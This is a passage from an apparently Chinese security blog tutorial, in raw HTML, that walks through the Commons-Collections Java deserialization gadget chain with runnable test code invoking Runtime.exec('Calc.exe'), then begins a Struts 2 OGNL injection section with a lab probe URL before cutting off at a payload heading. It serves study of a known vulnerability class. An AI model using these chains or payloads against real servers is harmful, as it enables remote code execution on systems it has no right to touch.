class=\"line\">TransformedMap</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221120171605414.png\" alt=\"image-20221120171605414\"></p>\n<p><strong>1.InvokerTransformer</strong></p>\n<p>这个 transform (Object input) 中使用 Java 反射机制调用了 input 对象的一个方法，而该方法名是实例化 InvokerTransformer 类时传入的 iMethodName 成员变量：</p>\n<p>功能函数 transform 需要传入一个对象，然后执行构造函数中给定的方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">InvokerTransformer</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Transformer</span>, Serializable &#123;</span><br><span class=\"line\">    <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">long</span> <span class=\"variable\">serialVersionUID</span> <span class=\"operator\">=</span> -<span class=\"number\">8653385846894047688L</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> String iMethodName;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> Class[] iParamTypes;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> Object[] iArgs;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> Object <span class=\"title function_\">transform</span><span class=\"params\">(Object input)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (input == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                <span class=\"type\">Class</span> <span class=\"variable\">cls</span> <span class=\"operator\">=</span> input.getClass();</span><br><span class=\"line\">                <span class=\"type\">Method</span> <span class=\"variable\">method</span> <span class=\"operator\">=</span> cls.getMethod(<span class=\"built_in\">this</span>.iMethodName, <span class=\"built_in\">this</span>.iParamTypes);</span><br><span class=\"line\">                <span class=\"keyword\">return</span> method.invoke(input, <span class=\"built_in\">this</span>.iArgs);    <span class=\"comment\">//以上三句获取对象，得到方法，执行方法</span></span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">FunctorException</span>(<span class=\"string\">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class=\"built_in\">this</span>.iMethodName + <span class=\"string\">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class=\"string\">&quot;&#x27; does not exist&quot;</span>);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (IllegalAccessException var6) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">FunctorException</span>(<span class=\"string\">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class=\"built_in\">this</span>.iMethodName + <span class=\"string\">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class=\"string\">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (InvocationTargetException var7) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">FunctorException</span>(<span class=\"string\">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class=\"built_in\">this</span>.iMethodName + <span class=\"string\">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class=\"string\">&quot;&#x27; threw an exception&quot;</span>, var7);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>测试代码</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * InvokerTransformer反射触发</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TransTest1</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span>  &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 创建实例 传入构造方法参数 （函数名 参数类型 参数值）</span></span><br><span class=\"line\">        <span class=\"type\">InvokerTransformer</span> <span class=\"variable\">invokerTransformer</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(</span><br><span class=\"line\">                <span class=\"string\">&quot;exec&quot;</span>,</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;String.class&#125;,</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">String</span>[]&#123;<span class=\"string\">&quot;Calc.exe&quot;</span>&#125;</span><br><span class=\"line\">        );</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 通过反射机制依次获得Runtime类 getRuntime构造方法 最后生成Runtime实例</span></span><br><span class=\"line\">            <span class=\"comment\">// Object input = Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;));</span></span><br><span class=\"line\">            <span class=\"type\">Object</span> <span class=\"variable\">input</span> <span class=\"operator\">=</span> Runtime.getRuntime();</span><br><span class=\"line\">                    <span class=\"comment\">// 执行transform函数</span></span><br><span class=\"line\">            invokerTransformer.transform(input);</span><br><span class=\"line\">        &#125;<span class=\"keyword\">catch</span> (Exception e)&#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><strong>2.ChainedTransformer</strong></p>\n<p>这个类创建实例时，需要传入一个 Transformer 数组，该类的功能就是遍历执行 Transformer 数组的 transform 函数，并且将上一次的 transform 函数的执行结果作为下一次 transform 的输入</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">ChainedTransformer</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Transformer</span>, Serializable &#123;</span><br><span class=\"line\">    <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">long</span> <span class=\"variable\">serialVersionUID</span> <span class=\"operator\">=</span> <span class=\"number\">3514945074733160196L</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> Transformer[] iTransformers;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">ChainedTransformer</span><span class=\"params\">(Transformer[] transformers)</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.iTransformers = transformers;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> Object <span class=\"title function_\">transform</span><span class=\"params\">(Object object)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; <span class=\"built_in\">this</span>.iTransformers.length; ++i) &#123;</span><br><span class=\"line\">            object = <span class=\"built_in\">this</span>.iTransformers[i].transform(object);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> object;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p><strong>3.ConstantTransformer</strong></p>\n<p>这个类的作用就是保存一个对象而已，创建实例时需要传入一个需要保存的对象，调用实例的 transform 即可获得其中的对象</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">ConstantTransformer</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Transformer</span>, Serializable &#123;</span><br><span class=\"line\">    <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">long</span> <span class=\"variable\">serialVersionUID</span> <span class=\"operator\">=</span> <span class=\"number\">6374440726369055124L</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">Transformer</span> <span class=\"variable\">NULL_INSTANCE</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ConstantTransformer</span>((Object)<span class=\"literal\">null</span>);</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> Object iConstant;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">ConstantTransformer</span><span class=\"params\">(Object constantToReturn)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.iConstant = constantToReturn;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//核心代码</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Object <span class=\"title function_\">transform</span><span class=\"params\">(Object input)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.iConstant;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Object <span class=\"title function_\">getConstant</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.iConstant;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>到这里，三个 Transformer 其实就可以连接起来了，先创建一个 Transformer 数组，用 ConstantTransformer 起手，传入一个对象，用 InvokeTransformer 一步一步调用函数，再将数组传入 ChainedTransformer，调用其 transform 函数。</p>\n<p>测试代码</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.Transformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * ChainedTransformer遍历触发</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> *   等同于 ((Runtime)Runtime.class.getMethod(&quot;getRuntime&quot;,null).invoke(null,null)).exec(&quot;calc.exe&quot;);</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TransTest2</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        Transformer[] transformers = <span class=\"keyword\">new</span> <span class=\"title class_\">Transformer</span>[]&#123;</span><br><span class=\"line\">                <span class=\"comment\">// 获得Runtime类对象</span></span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">ConstantTransformer</span>(Runtime.class),</span><br><span class=\"line\">                <span class=\"comment\">// 传入Runtime类对象 反射执行getMethod获得getRuntime方法</span></span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(</span><br><span class=\"line\">                        <span class=\"string\">&quot;getMethod&quot;</span>,</span><br><span class=\"line\">                        <span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;String.class,Class[].class&#125;,</span><br><span class=\"line\">                        <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;<span class=\"string\">&quot;getRuntime&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[<span class=\"number\">0</span>]&#125;</span><br><span class=\"line\">                ),</span><br><span class=\"line\">                <span class=\"comment\">// 传入getRuntime方法 反射执行invoke方法 得到Runtime实例</span></span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;invoke&quot;</span>,</span><br><span class=\"line\">                        <span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[] &#123;Object.class, Object[].class &#125;,</span><br><span class=\"line\">                        <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[] &#123;<span class=\"literal\">null</span>, <span class=\"literal\">null</span> &#125;</span><br><span class=\"line\">                ),</span><br><span class=\"line\">                <span class=\"comment\">// 传入Runtime实例 执行exec方法</span></span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;exec&quot;</span>,</span><br><span class=\"line\">                        <span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[] &#123;String.class &#125;,</span><br><span class=\"line\">                        <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[] &#123;<span class=\"string\">&quot;Calc.exe&quot;</span>&#125;)</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// ChainedTransformer</span></span><br><span class=\"line\">        <span class=\"type\">ChainedTransformer</span> <span class=\"variable\">chainedTransformer</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ChainedTransformer</span>(transformers);</span><br><span class=\"line\">        chainedTransformer.transform(<span class=\"literal\">null</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><strong>4.TransformedMap</strong></p>\n<p>TransformedMap 这个类中封装了一个 decorate 方法，它是用来修饰 Java 中的标准数据结构 Map，当向被修饰过的 Map 中添加新元素时，它就会执行一个回调函数；这个回调并不是传统意义上的回调函数，而是相当于执行一个对象里面的 transform 方法，前提是这个对象的类要实现了 Transformer 接口。</p>\n<p>key 和 value 都是 transform 的子类，keyTransformer 是处理新元素的 Key 的回调，valueTransformer 是处理新元素的 value 的回调，当我们向 outerMap 中添加新元素时，它就会调用 keyTransformer 或者 valueTransformer 里面的 transform 方法。</p>\n<p>checkSetValue 自动执行 value 中的 transform 子类对象</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TransformedMap</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AbstractInputCheckedMapDecorator</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Serializable</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">long</span> <span class=\"variable\">serialVersionUID</span> <span class=\"operator\">=</span> <span class=\"number\">7023152376788900464L</span>;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"keyword\">final</span> Transformer keyTransformer;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"keyword\">final</span> Transformer valueTransformer;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Map <span class=\"title function_\">decorate</span><span class=\"params\">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"title function_\">TransformedMap</span><span class=\"params\">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(map);</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.keyTransformer = keyTransformer;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.valueTransformer = valueTransformer;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">protected</span> Object <span class=\"title function_\">checkSetValue</span><span class=\"params\">(Object value)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.valueTransformer.transform(value);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p><strong>5.AbstractInputCheckedMapDecorator</strong></p>\n<p>通过 setValue 调用 checkSetValue</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">abstract</span> <span class=\"keyword\">class</span> <span class=\"title class_\">AbstractInputCheckedMapDecorator</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AbstractMapDecorator</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"title function_\">AbstractInputCheckedMapDecorator</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">static</span> <span class=\"keyword\">class</span> <span class=\"title class_\">MapEntry</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AbstractMapEntryDecorator</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> AbstractInputCheckedMapDecorator parent;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"title function_\">MapEntry</span><span class=\"params\">(Entry entry, AbstractInputCheckedMapDecorator parent)</span> &#123;</span><br><span class=\"line\">            <span class=\"built_in\">super</span>(entry);</span><br><span class=\"line\">            <span class=\"built_in\">this</span>.parent = parent;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> Object <span class=\"title function_\">setValue</span><span class=\"params\">(Object value)</span> &#123;</span><br><span class=\"line\">            value = <span class=\"built_in\">this</span>.parent.checkSetValue(value);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"built_in\">super</span>.entry.setValue(value);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>map 中的元素在增加删除修改的时候会调用 setValue 方法</p>\n<p><strong>6.AnnotationInvocationHandler</strong></p>\n<p>重写了 readobject，调用了 setValue 方法进行了键值修改</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title function_\">readObject</span><span class=\"params\">(java.io.ObjectInputStream s)</span></span><br><span class=\"line\">    <span class=\"keyword\">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class=\"line\">    ObjectInputStream.<span class=\"type\">GetField</span> <span class=\"variable\">fields</span> <span class=\"operator\">=</span> s.readFields();</span><br><span class=\"line\"></span><br><span class=\"line\">\t...</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">java</span>.io.InvalidObjectException(<span class=\"string\">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class=\"line\">    <span class=\"comment\">// consistent with runtime Map type</span></span><br><span class=\"line\">    Map&lt;String, Object&gt; mv = <span class=\"keyword\">new</span> <span class=\"title class_\">LinkedHashMap</span>&lt;&gt;();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// If there are annotation members without values, that</span></span><br><span class=\"line\">    <span class=\"comment\">// situation is handled by the invoke method.</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (Map.Entry&lt;String, Object&gt; memberValue : streamVals.entrySet()) &#123;</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">name</span> <span class=\"operator\">=</span> memberValue.getKey();</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">value</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">        Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (memberType != <span class=\"literal\">null</span>) &#123;  <span class=\"comment\">// i.e. member still exists</span></span><br><span class=\"line\">            value = memberValue.getValue();</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!(memberType.isInstance(value) ||</span><br><span class=\"line\">                  value <span class=\"keyword\">instanceof</span> ExceptionProxy)) &#123;</span><br><span class=\"line\">                  memberValue.setValue(</span><br><span class=\"line\">                \t<span class=\"keyword\">new</span> <span class=\"title class_\">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class=\"line\">                        value.getClass() + <span class=\"string\">&quot;[&quot;</span> + value + <span class=\"string\">&quot;]&quot;</span>).setMember(</span><br><span class=\"line\">                            annotationType.members().get(name)));</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>此时如果某台服务器上，开了一个服务，接受 java 序列化字节码，并且使用 ObjectInputStream.readObject 方法进行反序列化，那么我们构造的恶意代码就可以执行</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTEvYXJ0aWNsZS9kZXRhaWxzLzEwNjE2MDE4Mg==\">(70 条消息) 漫谈 Commons-Collections 反序列化_夏日清 1 的博客 - CSDN 博客</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vYml0dGVyei9wLzE1MDM1NTgxLmh0bWw=\">commons-collections 利用链学习总结 - bitterz - 博客园 (cnblogs.com)</span></p>\n<p><strong>讲都讲了，struts 一起讲了吧，凑个 java 大圆满～</strong></p>\n<h3 id=\"struts-2反序列化\"><a class=\"markdownIt-Anchor\" href=\"#struts-2反序列化\">#</a> struts 2 反序列化</h3>\n<p>SSH/SSM</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126171544473.png\" alt=\"image-20221126171544473\"></p>\n<p>Spring 管理 bean</p>\n<p>Struts 提供地址映射</p>\n<p>hibernate 持久层   /  mybatis</p>\n<p>配置 tomcat</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126173010089.png\" alt=\"image-20221126173010089\" style=\"zoom: 80%;\" />\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126173031317.png\" alt=\"image-20221126173031317\" style=\"zoom:80%;\" />\n<p>漏洞影响版本</p>\n<p>2.0.0 &lt;= Apache Struts &lt;= 2.5.29</p>\n<p>使用 %{} 解析 OGNL 表达式</p>\n<p 6*6=\"\"><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMTQyLjEyODoxODA4MC9pbmRleC5hY3Rpb24/aWQ9JTI1\">http://192.168.142.128:18080/index.action?id=%</span></p>\n<p>会执行 {} 内的内容，在网页源码中显示 36</p>\n<p>payload：</p>\n<p>执行 id</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span 